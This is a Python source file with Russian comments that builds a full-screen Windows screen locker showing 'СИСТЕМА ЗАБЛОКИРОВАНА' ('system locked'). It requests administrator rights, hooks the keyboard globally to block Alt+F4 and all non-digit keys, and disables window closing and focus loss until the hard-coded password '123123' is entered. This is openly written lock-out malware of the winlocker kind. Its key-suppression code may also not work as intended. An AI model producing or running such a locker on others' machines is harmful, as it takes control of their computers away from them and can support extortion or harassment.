import tkinter as tk
import keyboard
import ctypes
import sys
import os

# Глобальные переменные
password = "123123"
attempts = 0

# Блокировка Alt+F4 через глобальный хук
def block_alt_f4():
    keyboard.add_hotkey('alt+f4', lambda: None)

# Блокировка всех клавиш, кроме цифр, backspace, enter
def block_non_digits():
    allowed_keys = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'backspace', 'enter']
    def on_key(event):
        if event.name not in allowed_keys:
            return False
    keyboard.hook(on_key)

# Функция проверки пароля
def check_password(entry_var, root, entry):
    global attempts
    entered = entry_var.get()
    if entered == password:
        # Разблокировка и выход
        keyboard.unhook_all()
        root.destroy()
        sys.exit(0)
    else:
        attempts += 1
        entry_var.set("")
        label_error.config(text=f"Неверный пароль. Попытка {attempts}")
        entry.focus_set()

# Функция принудительного удержания фокуса
def keep_focus(entry):
    entry.focus_force()
    entry.after(100, lambda: keep_focus(entry))

# Создание полноэкранного блокировщика
def create_locker():
    global label_error
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.attributes('-toolwindow', True)
    root.bind('<Alt-F4>', lambda e: 'break')
    root.bind('<Escape>', lambda e: 'break')
    
    # Защита от закрытия через крестик (которого нет в полноэкранном режиме, но на всякий случай)
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    
    # Центральный фрейм
    frame = tk.Frame(root)
    frame.pack(expand=True)
    
    # Заголовок
    label_title = tk.Label(frame, text="СИСТЕМА ЗАБЛОКИРОВАНА", font=('Arial', 28, 'bold'), fg='red')
    label_title.pack(pady=20)
    
    # Поле ввода пароля
    entry_var = tk.StringVar()
    entry = tk.Entry(frame, textvariable=entry_var, font=('Arial', 24), justify='center', show='*')
    entry.pack(pady=20, ipadx=10, ipady=5)
    entry.focus_set()
    
    # Кнопка подтверждения
    submit_btn = tk.Button(frame, text="Разблокировать", font=('Arial', 16),
                          command=lambda: check_password(entry_var, root, entry))
    submit_btn.pack(pady=10)
    
    # Метка для ошибок
    label_error = tk.Label(frame, text="", font=('Arial', 12), fg='orange')
    label_error.pack(pady=10)
    
    # Привязка Enter к проверке
    entry.bind('<Return>', lambda event: check_password(entry_var, root, entry))
    
    # Принудительное удержание фокуса
    keep_focus(entry)
    
    root.mainloop()

if __name__ == "__main__":
    # Запрос прав администратора
    if ctypes.windll.shell32.IsUserAnAdmin():
        block_alt_f4()
        block_non_digits()
        create_locker()
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)